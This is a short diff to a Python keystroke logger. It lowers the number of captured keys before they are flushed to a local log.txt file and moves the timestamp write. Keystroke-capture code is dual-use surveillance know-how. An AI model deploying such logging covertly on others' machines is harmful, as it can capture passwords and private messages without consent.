@@ -18,8 +18,8 @@ def on_press(key):
     count += 1
     print("{0} pressed".format(key))                               
 
-    # after 10 keys pressed updates de file
-    if count >= 10:
+    # after 5 keys pressed updates de file
+    if count >= 5:
         count = 0
         write_file(keys)
         keys = []
@@ -28,11 +28,11 @@ def on_press(key):
 def write_file(keys):     
     space_count = 0
     with open("log.txt", "a") as f:
-        f.write('\n'+datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")+': ')
         for key in keys:
             k = str(key).replace("'","")
             if k.find("space") > 0 and space_count < 1  :
                 f.write('\n')
+                f.write('\n'+datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")+': ')
                 space_count += 1
             
             elif k.find("Key") == -1:
